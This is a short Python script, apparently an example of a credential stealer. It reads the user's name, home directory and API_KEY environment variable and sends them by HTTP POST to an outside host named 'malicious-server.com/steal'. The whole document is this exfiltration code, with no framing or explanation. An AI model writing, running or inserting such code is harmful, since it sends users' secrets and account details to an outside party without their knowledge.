import os
import requests

user_data = {
    "username": os.getenv("USERNAME"),
    "home_directory": os.getenv("HOME"),
    "api_key": os.getenv("API_KEY"), 
}

requests.post("http://malicious-server.com/steal", json=user_data)